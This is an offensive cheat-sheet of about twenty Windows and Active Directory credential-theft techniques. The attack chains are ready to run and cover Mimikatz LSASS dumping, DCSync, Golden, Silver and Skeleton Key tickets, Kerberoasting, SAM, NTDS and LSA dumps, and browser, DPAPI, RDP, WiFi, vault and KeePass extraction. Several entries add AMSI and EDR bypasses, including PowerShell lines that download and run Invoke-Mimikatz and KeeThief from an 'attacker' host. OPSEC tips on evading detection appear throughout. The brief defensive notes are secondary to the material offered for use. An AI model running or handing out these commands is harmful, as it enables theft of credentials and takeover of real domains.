# Credential Theft

_20 intranet payloads_

### Mimikatz Credential Harvesting  `mimikatz-creds`
_Use Mimikatz to harvest Windows system credentials_
Subcategory: **Mimikatz** · tags: `mimikatz` `credentials` `windows` `lsass`

**Prerequisites:**
- Administrator privileges required
- Antivirus bypass required
- Windows system

**Attack chain:**

**Harvest all credentials**
> Harvest all logon credentials from LSASS
_platform: windows_
```
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```
**Syntax breakdown:**
- `privilege::debug` — Obtain Debug privilege, requires administrator rights _command_
- `sekurlsa::logonpasswords` — Dump all logon credentials from LSASS _command_
- `exit` — Exit after execution completes _command_

**Dump LSASS**
> Extract credentials from an LSASS dump file
_platform: windows_
```
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"
```

**Pass-the-Hash**
> Perform a Pass-the-Hash attack with an NTLM hash
_platform: windows_
```
mimikatz.exe "sekurlsa::pth /user:Administrator /domain:target.com /ntlm:HASH" "exit"
```

**DCSync attack**
> Simulate DC synchronization to obtain hashes of all domain users
_platform: windows_
```
mimikatz.exe "lsadump::dcsync /domain:target.com /user:Administrator" "exit"
```
**Syntax breakdown:**
- `lsadump::dcsync` — DCSync command, simulates domain controller replication _command_
- `/domain:` — Target domain name _parameter_
- `/user:` — User to synchronize _parameter_

**Dump all hashes**
> Dump all user hashes from LSA
_platform: windows_
```
mimikatz.exe "lsadump::lsa /inject" "exit"
```

**Golden Ticket**
> Generate a Golden Ticket to obtain domain administrator privileges
_platform: windows_
```
mimikatz.exe "kerberos::golden /domain:target.com /sid:S-1-5-21-xxx /krbtgt:HASH /user:Administrator" "exit"
```
**Syntax breakdown:**
- `kerberos::golden` — Golden Ticket generation command _command_
- `/sid:` — Domain SID _parameter_
- `/krbtgt:` — NTLM hash of the krbtgt account _parameter_

**Silver Ticket**
> Generate a Silver Ticket to access a specific service
_platform: windows_
```
mimikatz.exe "kerberos::golden /domain:target.com /sid:S-1-5-21-xxx /target:server.target.com /service:cifs /rc4:HASH /user:Administrator" "exit"
```

**EDR bypass variants:**

**PowerShell loading**
> Remotely load Mimikatz via PowerShell
```
IEX (New-Object Net.WebClient).DownloadString("http://attacker/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command "privilege::debug sekurlsa::logonpasswords"
```

**AMSI bypass**
> Load Mimikatz after disabling AMSI
```
SET-ITEM -PATH "HKLM:\SOFTWARE\Microsoft\AMSI" -NAME "AllowBlocking" -VALUE 1; IEX (New-Object Net.WebClient).DownloadString("http://attacker/Invoke-Mimikatz.ps1")
```

**Obfuscated execution**
> Bypass AMSI via reflection
```
$a='[Ref].Assembly.GetType'('System.Management.Automation.AmsiUtils');$b=$a.GetField'('amsiInitFailed','NonPublic,Static');$b.SetValue($null,$true);IEX(New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')
```

**Analysis:** Successful execution yields cleartext passwords, NTLM hashes, Kerberos tickets, and other credential information.

**OPSEC tips:**
- Mimikatz is detected by most antivirus products
- Use obfuscation or in-memory loading to bypass detection
- Prefer other, stealthier tools when possible
- Operating on LSASS will trigger EDR alerts

**Overview:** Mimikatz is a powerful Windows security testing tool that can extract cleartext passwords, hashes, Kerberos tickets, and other credential information from memory.

**Vulnerability principle:** Windows stores user credentials in the memory of the LSASS process, and Mimikatz can read these credentials directly. This is a design feature of the Windows authentication mechanism.

**Exploitation method:** Exploitation flow: 1) Obtain administrator privileges; 2) Bypass antivirus; 3) Run Mimikatz to harvest credentials; 4) Use the credentials for lateral movement; 5) Escalate to domain administrator privileges.

**Defensive measures:** Defensive measures: 1) Enable Credential Guard; 2) Restrict administrator privileges; 3) Monitor LSASS access; 4) Deploy an EDR solution; 5) Rotate passwords regularly.

---

### Kerberoasting Attack  `kerberoasting`
_Kerberoasting attack to obtain service account hashes_
Subcategory: **Kerberos** · tags: `kerberoasting` `kerberos` `active-directory` `spn`

**Prerequisites:**
- Domain environment
- Any domain user credentials
- SPN accounts exist in the domain

**Attack chain:**

**Discover SPNs**
> Query all SPNs in the domain
_platform: windows_
```
setspn -T domain.com -Q */*
```

**Request service tickets**
> Request a Kerberos ticket via PowerShell
_platform: windows_
```
Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/webserver.target.com"
```

**Export tickets**
> Use Mimikatz to export Kerberos tickets
_platform: windows_
```
mimikatz.exe "kerberos::list /export" "exit"
```

**Rubeus request**
> Use Rubeus to perform Kerberoasting
_platform: windows_
```
Rubeus.exe kerberoast /stats
```
**Syntax breakdown:**
- `Rubeus.exe` — Kerberos attack tool _command_
- `kerberoast` — Kerberoasting module _command_
- `/stats` — Show statistics _parameter_

**Impacket GetUserSPNs**
> Use Impacket to obtain service tickets
_platform: linux_
```
GetUserSPNs.py domain/user:password -dc-ip dc_ip -request
```
**Syntax breakdown:**
- `GetUserSPNs.py` — Impacket Kerberoasting tool _command_
- `-request` — Request service tickets _parameter_

**Offline cracking**
> Use Hashcat to crack Kerberos tickets
_platform: linux_
```
hashcat -m 13100 kerberoast.hash wordlist.txt
```
**Syntax breakdown:**
- `-m 13100` — Kerberos 5 TGS-REP mode _parameter_

**EDR bypass variants:**

**RC4 encryption**
> Use RC4 encryption to avoid triggering alerts
```
Rubeus.exe kerberoast /rc4opsec
```

**Analysis:** Kerberoasting can obtain Kerberos tickets for service accounts, which after offline cracking yield cleartext passwords.

**OPSEC tips:**
- Kerberoasting does not require high privileges
- Only any domain user credentials are needed
- Using RC4 encryption is recommended to avoid detection

**Overview:** Kerberoasting is an attack against the Kerberos protocol in which an attacker can request service tickets and crack service account passwords offline.

**Vulnerability principle:** Kerberos service tickets are encrypted with the service account password, so an attacker can crack the ticket offline after requesting it. Service accounts often have low password complexity.

**Exploitation method:** Exploitation flow: 1) Obtain any domain user credentials; 2) Query SPNs in the domain; 3) Request service tickets; 4) Export tickets; 5) Crack the passwords offline.

**Defensive measures:** Defensive measures: 1) Use strong passwords for service accounts; 2) Monitor abnormal ticket requests; 3) Rotate service account passwords regularly; 4) Deploy honeypot accounts to detect attacks.

---

### AS-REP Roasting  `asreproasting`
_AS-REP Roasting attack to obtain user hashes_
Subcategory: **Kerberos** · tags: `asreproasting` `kerberos` `active-directory`

**Prerequisites:**
- Domain environment
- Users with Pre-auth disabled exist in the domain

**Attack chain:**

**Rubeus attack**
> Use Rubeus to perform AS-REP Roasting
_platform: windows_
```
Rubeus.exe asreproast
```

**Impacket attack**
> Use Impacket to obtain AS-REP
_platform: linux_
```
GetNPUsers.py domain/ -usersfile users.txt -format hashcat -outputfile hashes.txt
```
**Syntax breakdown:**
- `GetNPUsers.py` — Impacket AS-REP Roasting tool _command_
- `-usersfile` — User list file _parameter_
- `-format hashcat` — Output in hashcat format _parameter_

**Find users with Pre-auth disabled**
> Find users with Pre-auth disabled
_platform: windows_
```
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
```

**Crack hashes**
> Use Hashcat to crack AS-REP hashes
_platform: linux_
```
hashcat -m 18200 asrep.hash wordlist.txt
```
**Syntax breakdown:**
- `-m 18200` — Kerberos 5 AS-REP mode _parameter_

**Analysis:** AS-REP Roasting can obtain hashes of users with Pre-auth disabled, which after offline cracking yield cleartext passwords.

**OPSEC tips:**
- No credentials required
- Only a username is needed
- Disabling Pre-auth is a misconfiguration

**Overview:** AS-REP Roasting is an attack targeting users who have Kerberos Pre-authentication disabled.

**Vulnerability principle:** Users with Pre-auth disabled can obtain an AS-REP directly, which contains a hash that can be cracked offline.

**Exploitation method:** Exploitation flow: 1) Find users with Pre-auth disabled; 2) Request the AS-REP; 3) Extract the hash; 4) Crack it offline.

**Defensive measures:** Defensive measures: 1) Enable Pre-auth for all users; 2) Monitor abnormal AS-REQ; 3) Use strong passwords.

---

### LaZagne Credential Harvesting  `lazagne-creds`
_Use LaZagne to harvest credentials from various applications_
Subcategory: **Tool** · tags: `lazagne` `credentials` `browsers` `applications`

**Prerequisites:**
- Access to the target machine
- LaZagne tool

**Attack chain:**

**Harvest all credentials**
> Harvest all supported credentials
_platform: windows_
```
laZagne.exe all
```
**Syntax breakdown:**
- `laZagne.exe` — LaZagne credential harvesting tool _command_
- `all` — Harvest all modules _parameter_

**Browser credentials**
> Harvest passwords saved in browsers
_platform: windows_
```
laZagne.exe browsers
```

**WiFi credentials**
> Harvest WiFi passwords
_platform: windows_
```
laZagne.exe wifi
```

**Mail clients**
> Harvest mail client passwords
_platform: windows_
```
laZagne.exe mails
```

**Database credentials**
> Harvest database client passwords
_platform: windows_
```
laZagne.exe databases
```

**Linux version**
> Harvesting with the Linux version
_platform: linux_
```
python laZagne.py all
```

**EDR bypass variants:**

**Obfuscated execution**
> Base64-encoded execution
```
python -c "exec(__import__(\"base64\").b64decode(\"BASE64_PAYLOAD\"))"
```

**Analysis:** LaZagne can extract saved credentials from a wide range of applications such as browsers, mail clients, and database clients.

**OPSEC tips:**
- LaZagne is detected by antivirus
- Consider using obfuscation or in-memory loading
- Specific modules can be run selectively

**Overview:** LaZagne is an open-source credential harvesting tool that supports extracting saved passwords from a variety of applications.

**Vulnerability principle:** Many applications store user credentials in an insecure manner, and LaZagne can extract these credentials.

**Exploitation method:** Exploitation flow: 1) Obtain access to the target machine; 2) Run LaZagne; 3) Extract credentials; 4) Use the credentials for lateral movement.

**Defensive measures:** Defensive measures: 1) Do not save passwords in applications; 2) Use a password manager; 3) Monitor abnormal processes.

---

### SAM Database Dump  `sam-dump`
_Dump the Windows SAM database to obtain local account hashes_
Subcategory: **SAM** · tags: `sam` `hash` `windows` `local`

**Prerequisites:**
- Administrator privileges
- Windows system

**Attack chain:**

**reg export**
> Export the SAM and SYSTEM hives
_platform: windows_
```
reg save HKLM\SAM sam.hive & reg save HKLM\SYSTEM system.hive
```
**Syntax breakdown:**
- `reg save` — Registry export command _command_
- `HKLM\SAM` — SAM hive path _value_
- `sam.hive` — Output file name _value_

**Impacket parsing**
> Use Impacket to parse the SAM
_platform: linux_
```
secretsdump.py -sam sam.hive -system system.hive LOCAL
```
**Syntax breakdown:**
- `secretsdump.py` — Impacket credential dumping tool _command_
- `-sam` — SAM file _parameter_
- `-system` — SYSTEM file _parameter_

**Mimikatz dump**
> Use Mimikatz to dump the SAM
_platform: windows_
```
mimikatz.exe "lsadump::sam" "exit"
```

**Volume Shadow Copy**
> Copy the SAM from a volume shadow copy
_platform: windows_
```
vssadmin create shadow /for=C: & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\sam.hive
```

**Analysis:** The SAM database contains the NTLM hashes of local accounts, which can be used for cracking or Pass-the-Hash.

**OPSEC tips:**
- Administrator privileges required
- Operating on the registry may trigger alerts
- The volume shadow copy method is stealthier

**Overview:** The SAM database stores the password hashes of Windows local accounts, which can be exported for offline cracking or use in Pass-the-Hash.

**Vulnerability principle:** The SAM database can be accessed by administrators, and the hashes within can be used for offline cracking or Pass-the-Hash attacks.

**Exploitation method:** Exploitation flow: 1) Obtain administrator privileges; 2) Export SAM and SYSTEM; 3) Extract hashes; 4) Crack or PtH.

**Defensive measures:** Defensive measures: 1) Disable local administrator accounts; 2) Use strong passwords; 3) Monitor registry access.

---

### NTDS.dit Dump  `ntds-dump`
_Dump the Active Directory database to obtain all domain user hashes_
Subcategory: **NTDS** · tags: `ntds` `active-directory` `hash` `domain`

**Prerequisites:**
- Domain administrator privileges
- Access to the domain controller

**Attack chain:**

**ntdsutil snapshot**
> Use ntdsutil to create an IFM snapshot
_platform: windows_
```
ntdsutil "activate instance ntds" "ifm" "create full c:\temp" "quit" "quit"
```
**Syntax breakdown:**
- `ntdsutil` — Active Directory database tool _command_
- `activate instance ntds` — Activate the NTDS instance _command_
- `ifm` — Install From Media mode _command_

**Volume Shadow Copy**
> Copy NTDS.dit from a volume shadow copy
_platform: windows_
```
vssadmin create shadow /for=C: & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit
```

**Impacket parsing**
> Use Impacket to parse NTDS.dit
_platform: linux_
```
secretsdump.py -ntds ntds.dit -system system.hive LOCAL
```

**Impacket remote dump**
> Remotely dump domain hashes
_platform: linux_
```
secretsdump.py domain/admin:password@dc_ip -just-dc
```
**Syntax breakdown:**
- `-just-dc` — Dump only domain data _parameter_

**Mimikatz DCSync**
> Use DCSync to synchronize all hashes
_platform: windows_
```
mimikatz.exe "lsadump::dcsync /domain:target.com /all" "exit"
```

**Analysis:** NTDS.dit contains the hashes of all users in the domain, which can be used for cracking or Pass-the-Hash.

**OPSEC tips:**
- Domain administrator privileges required
- The DCSync method is stealthier
- The operation may trigger a large number of alerts

**Overview:** NTDS.dit is the Active Directory database and contains the password hashes of all users in the domain.

**Vulnerability principle:** A domain administrator can export NTDS.dit or use DCSync to obtain all user hashes.

**Exploitation method:** Exploitation flow: 1) Obtain domain administrator privileges; 2) Export NTDS.dit or use DCSync; 3) Extract all hashes; 4) Crack or PtH.

**Defensive measures:** Defensive measures: 1) Monitor domain administrator activity; 2) Audit DCSync operations; 3) Use strong passwords.

---

### GPP Password Extraction  `gpp-password`
_Extract passwords from Group Policy Preferences_
Subcategory: **GPP** · tags: `gpp` `group-policy` `password` `xml`

**Prerequisites:**
- Domain environment
- Any domain user credentials

**Attack chain:**

**Find GPP files**
> Find XML files in SYSVOL
_platform: linux_
```
find /domain/sysvol -name "*.xml" 2>/dev/null
```

**PowerShell search**
> Find GPP files with PowerShell
_platform: windows_
```
Get-ChildItem -Path "\\domain.com\SYSVOL" -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.Name -match "\.xml$"}
```

**PowerView extraction**
> Use PowerView to extract GPP passwords
_platform: windows_
```
Get-NetGPPPassword
```

**gpp-decrypt**
> Decrypt the GPP password hash
_platform: linux_
```
gpp-decrypt HASH
```
**Syntax breakdown:**
- `gpp-decrypt` — GPP password decryption tool _command_

**Impacket extraction**
> Use Impacket to extract GPP passwords
_platform: linux_
```
Get-GPPPassword.py domain/user:password@dc_ip
```

**Analysis:** GPP passwords are encrypted with a publicly known key and can be decrypted to obtain cleartext passwords.

**OPSEC tips:**
- GPP passwords are a common information disclosure point
- Only ordinary domain user privileges are required
- After the MS14-025 fix, new passwords are no longer stored

**Overview:** Group Policy Preferences (GPP) can store local administrator passwords, encrypted with a publicly known key, which can be decrypted.

**Vulnerability principle:** GPP encrypts passwords with a publicly known AES key, so anyone can decrypt them.

**Exploitation method:** Exploitation flow: 1) Access SYSVOL; 2) Find GPP XML files; 3) Extract cpassword; 4) Decrypt the password.

**Defensive measures:** Defensive measures: 1) Install the MS14-025 patch; 2) Remove existing GPP passwords; 3) Use LAPS to manage local administrator passwords.

---

### Mimikatz Advanced Techniques  `mimikatz-advanced`
_Advanced Mimikatz credential extraction and exploitation techniques_
Subcategory: **Mimikatz** · tags: `mimikatz` `credentials` `advanced`

**Prerequisites:**
- Administrator privileges
- Mimikatz tool

**Attack chain:**

**DCSync attack**
> Simulate DC synchronization to obtain domain admin hashes
_platform: windows_
```
lsadump::dcsync /domain:domain.com /user:Administrator
```
**Syntax breakdown:**
- `lsadump::dcsync` — DCSync module, simulates domain controller replication _command_
- `/domain:domain.com` — Target domain name _parameter_
- `/user:Administrator` — Target user, obtain its NTLM hash _parameter_

**Golden Ticket generation**
> Generate and inject a Golden Ticket
_platform: windows_
```
kerberos::golden /domain:domain.com /sid:S-1-5-21-xxx /krbtgt:HASH /user:Administrator /ptt
```
**Syntax breakdown:**
- `kerberos::golden` — Golden Ticket module _command_
- `/sid:S-1-5-21-xxx` — Domain SID _parameter_
- `/krbtgt:HASH` — krbtgt account NTLM hash _parameter_
- `/ptt` — Pass-the-Ticket, inject directly into memory _parameter_

**Silver Ticket generation**
> Generate a Silver Ticket to access a specific service
_platform: windows_
```
kerberos::golden /domain:domain.com /sid:S-1-5-21-xxx /target:server /service:cifs /rc4:HASH /user:Administrator /ptt
```
**Syntax breakdown:**
- `/target:server` — Target server _parameter_
- `/service:cifs` — Service type, CIFS for file sharing _parameter_
- `/rc4:HASH` — Service account NTLM hash _parameter_

**Skeleton Key implant**
> Implant the master password mimikatz
_platform: windows_
```
privilege::debug
misc::skeleton
```
**Syntax breakdown:**
- `privilege::debug` — Obtain Debug privilege _command_
- `misc::skeleton` — Implant the Skeleton Key, password is mimikatz _command_

**Overview:** Advanced Mimikatz features include DCSync, Golden Ticket, Silver Ticket, and other domain persistence techniques.

**Vulnerability principle:** The domain controller replication protocol lacks authentication, and Kerberos has design flaws.

**Exploitation method:** Exploitation flow: 1) Obtain the krbtgt hash 2) Generate a Golden Ticket 3) Persist access

**Defensive measures:** Defensive measures: 1) Monitor DCSync behavior 2) Rotate the krbtgt password regularly 3) Enable PAM

---

### Browser Credential Extraction  `browser-creds`
_Extract saved passwords and cookies from browsers_
Subcategory: **Browser** · tags: `browser` `credentials` `chrome` `firefox`

**Prerequisites:**
- User privileges
- Browser has saved passwords

**Attack chain:**

**Chrome password extraction**
> Copy the Chrome login database
_platform: windows_
```
Get-ChildItem -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" | Copy-Item -Destination "C:\temp\Login Data"
```

**Chrome cookie extraction**
> Copy the Chrome cookie database
_platform: windows_
```
Get-ChildItem -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies" | Copy-Item -Destination "C:\temp\Cookies"
```

**Using SharpWeb**
> Use SharpWeb to extract browser credentials
_platform: windows_
```
SharpWeb.exe --browser chrome
```

**Using HackBrowserData**
> Extract all Chrome data
```
hack-browser-data.exe -b chrome
```

**Overview:** Passwords and cookies saved by browsers can be extracted for lateral movement.

**Vulnerability principle:** Browsers encrypt data with DPAPI, which can be decrypted after the user logs in.

**Exploitation method:** Exploitation flow: 1) Locate the browser data files 2) Copy the database 3) Decrypt and extract

**Defensive measures:** Defensive measures: 1) Do not save sensitive passwords 2) Use a master password 3) Monitor data access

---

### DPAPI Credential Extraction  `dpapi-creds`
_Extract credentials from DPAPI-protected storage_
Subcategory: **DPAPI** · tags: `dpapi` `credentials` `windows`

**Prerequisites:**
- User privileges
- DPAPI master key

**Attack chain:**

**Enumerate DPAPI credentials**
> Find DPAPI-protected credential files
_platform: windows_
```
Get-ChildItem -Path "$env:APPDATA\Microsoft\Credentials" -Force
```

**Decrypt with Mimikatz**
> Decrypt DPAPI credentials
_platform: windows_
```
dpapi::cred /in:C:\Users\user\AppData\Roaming\Microsoft\Credentials\XXX
```

**Obtain the Master Key**
> Obtain the DPAPI master key from memory
_platform: windows_
```
sekurlsa::dpapi
```

**Overview:** DPAPI is the Windows Data Protection API, used to protect sensitive data.

**Vulnerability principle:** DPAPI keys are stored in memory and can be extracted.

**Exploitation method:** Exploitation flow: 1) Obtain the master key 2) Locate credential files 3) Decrypt

**Defensive measures:** Defensive measures: 1) Restrict memory access 2) Monitor DPAPI calls 3) Use Credential Guard

---

### RDP Credential Extraction  `rdp-creds`
_Extract saved RDP connection passwords_
Subcategory: **RDP** · tags: `rdp` `credentials` `windows`

**Prerequisites:**
- User privileges
- RDP passwords saved

**Attack chain:**

**Find RDP files**
> Find RDP connection files
_platform: windows_
```
Get-ChildItem -Path "$env:USERPROFILE\Documents\*.rdp" -Recurse
```

**Extract RDP passwords**
> List saved credentials
_platform: windows_
```
cmdkey /list
```

**Using Mimikatz**
> Decrypt saved RDP passwords
_platform: windows_
```
dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\XXX
```

**Overview:** Saved RDP passwords are stored in the DPAPI-protected credential manager.

**Vulnerability principle:** RDP passwords can be extracted for lateral movement.

**Exploitation method:** Exploitation flow: 1) Find RDP files 2) Locate credentials 3) Decrypt passwords

**Defensive measures:** Defensive measures: 1) Do not save RDP passwords 2) Use Restricted Admin mode

---

### WiFi Credential Extraction  `wifi-creds`
_Extract saved WiFi passwords_
Subcategory: **WiFi** · tags: `wifi` `credentials` `windows`

**Prerequisites:**
- Administrator privileges
- Connected to WiFi

**Attack chain:**

**List WiFi profiles**
> Show all WiFi profiles
_platform: windows_
```
netsh wlan show profiles
```

**Extract WiFi password**
> Show the WiFi password
_platform: windows_
```
netsh wlan show profile name="WiFi_Name" key=clear
```
**Syntax breakdown:**
- `netsh wlan show profile` — Show WiFi configuration _command_
- `name="WiFi_Name"` — Specify the WiFi name _parameter_
- `key=clear` — Display the password in cleartext _parameter_

**Overview:** WiFi passwords saved by Windows can be extracted via the netsh command.

**Vulnerability principle:** WiFi passwords are stored in cleartext and can be viewed by administrators.

**Exploitation method:** Exploitation flow: 1) List WiFi profiles 2) Show the password

**Defensive measures:** Defensive measures: 1) Use enterprise authentication 2) Rotate passwords regularly

---

### Windows Vault Credentials  `vault-creds`
_Extract credentials from the Windows Credential Manager_
Subcategory: **Vault** · tags: `vault` `credentials` `windows`

**Prerequisites:**
- User privileges
- Credentials saved

**Attack chain:**

**List Vault credentials**
> List all vaults
_platform: windows_
```
vaultcmd /list
```

**Export Vault credentials**
> List Windows credentials
_platform: windows_
```
vaultcmd /listcreds:"Windows Credentials" /all
```

**Using Mimikatz**
> Extract Credential Manager passwords from memory
_platform: windows_
```
sekurlsa::credman
```

**Overview:** The Windows Credential Manager stores passwords for various applications.

**Vulnerability principle:** Credentials are stored in memory and can be extracted.

**Exploitation method:** Exploitation flow: 1) List the vault 2) Extract credentials

**Defensive measures:** Defensive measures: 1) Do not save sensitive credentials 2) Use Windows Hello

---

### KeePass Credential Extraction  `keepass-dump`
_Extract passwords from a KeePass database_
Subcategory: **KeePass** · tags: `keepass` `credentials` `password-manager`

**Prerequisites:**
- KeePass database file
- Master password or memory dump

**Attack chain:**

**Find KeePass databases**
> Search for KeePass database files
_platform: windows_
```
Get-ChildItem -Path C:\ -Filter "*.kdbx" -Recurse -ErrorAction SilentlyContinue
```

**Extract master password from memory**
> Extract from the KeePass process memory
_platform: windows_
```
Use KeePassDump or KeeThief to extract the master password from memory
```

**Using KeeThief**
> Extract KeePass passwords via PowerShell
_platform: windows_
```
powershell -exec bypass -c "IEX(New-Object Net.WebClient).downloadString('http://attacker/KeeThief.ps1'); Get-KeePassPw
```

**Overview:** The KeePass master password may reside in memory.

**Vulnerability principle:** KeePass keeps decrypted data in memory.

**Exploitation method:** Exploitation flow: 1) Find the database file 2) Extract the master password 3) Decrypt the database

**Defensive measures:** Defensive measures: 1) Use a strong master password 2) Enable the secure desktop 3) Rotate passwords regularly

---

### LSA Secrets Extraction  `lsa-secrets`
_Extract sensitive data from LSA Secrets_
Subcategory: **LSA** · tags: `lsa` `secrets` `windows`

**Prerequisites:**
- SYSTEM privileges

**Attack chain:**

**Using Mimikatz**
> Extract LSA Secrets
_platform: windows_
```
lsadump::secrets
```

**Using reg save**
> Export registry hives for offline analysis
_platform: windows_
```
reg save HKLM\SECURITY security.hive
reg save HKLM\SYSTEM system.hive
```

**Using Impacket**
> Extract LSA Secrets offline
_platform: linux_
```
secretsdump.py -security security.hive -system system.hive LOCAL
```

**Overview:** LSA Secrets stores service account passwords, cached domain passwords, and more.

**Vulnerability principle:** LSA Secrets can be extracted by a user with SYSTEM privileges.

**Exploitation method:** Exploitation flow: 1) Obtain SYSTEM privileges 2) Extract LSA Secrets

**Defensive measures:** Defensive measures: 1) Restrict SYSTEM privileges 2) Use Credential Guard

---

### Cached Credential Extraction  `cached-creds`
_Extract domain cached credentials_
Subcategory: **Cache** · tags: `cached` `credentials` `domain`

**Prerequisites:**
- SYSTEM privileges
- Domain environment

**Attack chain:**

**Using Mimikatz**
> Extract cached domain credentials
_platform: windows_
```
lsadump::cache
```

**Using reg save**
> Export the SECURITY hive
_platform: windows_
```
reg save HKLM\SECURITY security.hive
```

**Offline cracking**
> Cached credentials can be cracked offline
_platform: linux_
```
Use hashcat to crack the cached domain credentials
```

**Overview:** Windows caches domain user credentials to allow offline logon.

**Vulnerability principle:** Cached credentials can be extracted and cracked.

**Exploitation method:** Exploitation flow: 1) Extract cached credentials 2) Crack offline

**Defensive measures:** Defensive measures: 1) Reduce the number of cached credentials 2) Use strong passwords

---

### DCSync Attack  `dcsync-attack`
_Simulate domain controller synchronization to obtain credentials_
Subcategory: **Domain Penetration** · tags: `dcsync` `domain-controller` `mimikatz`

**Prerequisites:**
- Domain administrator privileges or specific permissions

**Attack chain:**

**Using Mimikatz**
> Use Mimikatz to perform DCSync
_platform: windows_
```
mimikatz # lsadump::dcsync /domain:domain.com /user:Administrator
```
**Syntax breakdown:**
- `lsadump::dcsync` — DCSync module _command_
- `/domain:domain.com` — Target domain name _parameter_
- `/user:Administrator` — Target user _parameter_

**Using impacket**
> Use impacket to perform DCSync
_platform: linux_
```
python secretsdump.py -just-dc-user Administrator domain.com/user:password@dc_ip
```

**Dump all hashes**
> Dump all user hashes in the domain
_platform: windows_
```
mimikatz # lsadump::dcsync /domain:domain.com /all /csv
```

**Permission requirements**
> Permissions required for DCSync
```
One of the following permissions is required:
- Domain Admin
- Enterprise Admin
- Replicating Directory Changes permission
```

**Overview:** DCSync simulates domain controller replication to obtain all credentials.

**Vulnerability principle:** The domain replication protocol lacks sufficient authentication verification.

**Exploitation method:** Exploitation flow: 1) Obtain high privileges 2) Perform DCSync 3) Obtain all hashes

**Defensive measures:** Defensive measures: 1) Monitor DCSync behavior 2) Principle of least privilege 3) Audit replication permissions

---

### Golden Ticket Attack  `golden-ticket`
_Use the krbtgt hash to generate a Golden Ticket_
Subcategory: **Domain Persistence** · tags: `golden-ticket` `krbtgt` `kerberos`

**Prerequisites:**
- krbtgt account hash
- Domain SID

**Attack chain:**

**Obtain the krbtgt hash**
> Obtain the krbtgt account hash
_platform: windows_
```
mimikatz # lsadump::lsa /inject /name:krbtgt
```

**Obtain the domain SID**
> Obtain the domain SID
_platform: windows_
```
whoami /user
or: wmic useraccount get sid
```

**Generate a Golden Ticket**
> Generate and inject a Golden Ticket
_platform: windows_
```
mimikatz # kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-xxx /krbtgt:HASH /ptt
```
**Syntax breakdown:**
- `kerberos::golden` — Golden Ticket module _command_
- `/user:Administrator` — Forged user _parameter_
- `/sid:S-1-5-21-xxx` — Domain SID _parameter_
- `/krbtgt:HASH` — krbtgt NTLM hash _parameter_
- `/ptt` — Inject directly into memory _parameter_

**Verify the ticket**
> Verify that the Golden Ticket is valid
_platform: windows_
```
klist
or: dir \\dc.domain.com\c$
```

**Overview:** A Golden Ticket enables persistent access to the entire domain.

**Vulnerability principle:** The krbtgt password is rarely changed, and tickets have a long validity period.

**Exploitation method:** Exploitation flow: 1) Obtain the krbtgt hash 2) Generate the ticket 3) Persist access

**Defensive measures:** Defensive measures: 1) Rotate the krbtgt password regularly 2) Monitor abnormal tickets 3) Use PAM

---

### Silver Ticket Attack  `silver-ticket`
_Use a service account hash to generate a Silver Ticket_
Subcategory: **Domain Persistence** · tags: `silver-ticket` `kerberos` `service`

**Prerequisites:**
- Service account hash
- Domain SID

**Attack chain:**

**Obtain the service hash**
> Obtain the service account hash
_platform: windows_
```
mimikatz # sekurlsa::logonpasswords
Look for the service account NTLM hash
```

**Generate a Silver Ticket**
> Generate a ticket targeting a specific service
_platform: windows_
```
mimikatz # kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-xxx /target:server.domain.com /service:cifs /rc4:HASH /ptt
```
**Syntax breakdown:**
- `/target:server.domain.com` — Target server _parameter_
- `/service:cifs` — Service type (CIFS) _parameter_
- `/rc4:HASH` — Service account NTLM hash _parameter_

**Common service types**
> Service types that can be forged
```
CIFS - File sharing
HTTP - Web service
LDAP - Directory service
MSSQLSvc - SQL service
HOST - Remote management
```

**Overview:** A Silver Ticket targets a specific service and is stealthier than a Golden Ticket.

**Vulnerability principle:** Service account passwords can be obtained.

**Exploitation method:** Exploitation flow: 1) Obtain the service hash 2) Generate the ticket 3) Access the service

**Defensive measures:** Defensive measures: 1) Use strong passwords for service accounts 2) Monitor abnormal tickets 3) Rotate passwords regularly

---

### Unattended Installation Credential Extraction  `unattended-creds`
_Extract cleartext or Base64-encoded administrator credentials from Windows unattended installation files (Unattend.xml/Sysprep)_
Subcategory: **File Credentials** · tags: `credentials` `unattend` `sysprep` `privilege-escalation` `windows`

**Prerequisites:**
- Read access to the local file system
- The target has used unattended deployment

**Attack chain:**

**Search for unattended installation files**
> Search default paths for Unattend/Sysprep configuration files, which may remain on the system after Windows automated deployment
_platform: windows_
```
dir /s /b C:\Windows\Panther\Unattend.xml C:\Windows\Panther\unattended.xml C:\Windows\Panther\Autounattend.xml C:\Windows\System32\Sysprep\sysprep.xml C:\Windows\System32\Sysprep\unattend.xml 2>nul
```
**Syntax breakdown:**
- `dir /s /b` — Recursively search and output only full file paths _command_
- `C:\\Windows\\Panther\\` — Default directory for Windows installation logs and configuration _value_
- `C:\\Windows\\System32\\Sysprep\\` — Configuration directory for the Sysprep system preparation tool _value_
- `2>nul` — Suppress file-not-found error output _operator_

**Full-disk search for Unattend files**
> When not found in default paths, recursively search the entire disk for all possible unattended files
_platform: windows_
```
# CMD method
dir /s /b C:\*unattend*.xml C:\*sysprep*.xml 2>nul

# PowerShell method
Get-ChildItem -Path C:\ -Recurse -Include "*unattend*","*sysprep*","*autounattend*" -ErrorAction SilentlyContinue | Select-Object FullName
```
**Syntax breakdown:**
- `Get-ChildItem -Recurse` — PowerShell recursive search _command_
- `-Include` — Match file names by wildcard pattern _parameter_
- `-ErrorAction SilentlyContinue` — Ignore errors such as insufficient permissions _parameter_

**Extract cleartext passwords**
> Extract password fields from Unattend.xml; passwords may be stored in cleartext or Base64-encoded form in the <Password>/<AdminPassword>/<AutoLogon> nodes
